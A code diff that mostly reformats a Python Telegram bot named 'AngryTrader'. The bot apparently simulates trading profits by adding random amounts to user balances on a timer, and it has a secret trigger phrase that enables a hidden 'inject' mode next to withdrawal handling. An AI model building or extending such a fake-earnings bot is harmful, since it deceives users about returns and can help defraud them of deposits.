@@ -4,12 +4,7 @@ import requests
 import asyncio
 from aiohttp import web
 
-from telegram import (
-    Update,
-    InlineKeyboardButton,
-    InlineKeyboardMarkup,
-    InputFile,
-)
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, InputFile, Update
 from telegram.ext import (
     ApplicationBuilder,
     CommandHandler,
@@ -19,22 +14,16 @@ from telegram.ext import (
     filters,
 )
 
-# --- CONFIG ---
-
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 if not BOT_TOKEN:
     raise RuntimeError("BOT_TOKEN environment variable is not set")
 
 SECRET_INJECT_TRIGGER = "🦍 banana_mode_69420"
 
-# --- DATA STORE ---
-
 user_balances = {}
 user_states = {}
 pending_inject = {}
 pending_withdrawal = {}
-
-# --- UI ---
 
 def get_main_menu():
     keyboard = [
@@ -55,7 +44,6 @@ def get_main_menu():
     ]
     return InlineKeyboardMarkup(keyboard)
 
-
 def get_strategy_menu():
     keyboard = [
         [
@@ -66,8 +54,6 @@ def get_strategy_menu():
         [InlineKeyboardButton("🔙 Back", callback_data='back_to_main')]
     ]
     return InlineKeyboardMarkup(keyboard)
-
-# --- HANDLERS ---
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -83,7 +69,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Welcome to AngryTrader")
 
     await update.message.reply_text("Choose an option:", reply_markup=get_main_menu())
-
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -228,7 +213,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await query.edit_message_text("❓ Unknown action", reply_markup=get_main_menu())
 
-
 async def handle_secret_inject(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     text = update.message.text.strip()
@@ -272,19 +256,14 @@ async def handle_secret_inject(update: Update, context: ContextTypes.DEFAULT_TYP
             )
             return
 
-
 async def profit_simulator_tick(context: ContextTypes.DEFAULT_TYPE):
     for user_id, state in user_states.items():
         if state.get("running"):
             profit = random.uniform(0.00001, 0.00005)
             user_balances[user_id] = user_balances.get(user_id, 0.0) + profit
 
-
-# --- WEB SERVER ---
-
 async def handle(request):
     return web.Response(text="OK")
-
 
 async def run_webserver():
     app = web.Application()
@@ -298,10 +277,7 @@ async def run_webserver():
     while True:
         await asyncio.sleep(3600)
 
-
-# --- MAIN ---
-
-async def async_main():
+async def main():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
 
     app.add_handler(CommandHandler("start", start))
@@ -310,15 +286,14 @@ async def async_main():
 
     app.job_queue.run_repeating(profit_simulator_tick, interval=5, first=5)
 
+    # Run bot polling and webserver concurrently
     await asyncio.gather(
         app.run_polling(),
-        run_webserver(),
+        run_webserver()
     )
 
-
 if __name__ == "__main__":
-    loop = asyncio.get_event_loop()
-    try:
-        loop.run_until_complete(async_main())
-    except KeyboardInterrupt:
-        pass
+    import nest_asyncio
+    nest_asyncio.apply()
+    import asyncio
+    asyncio.run(main())
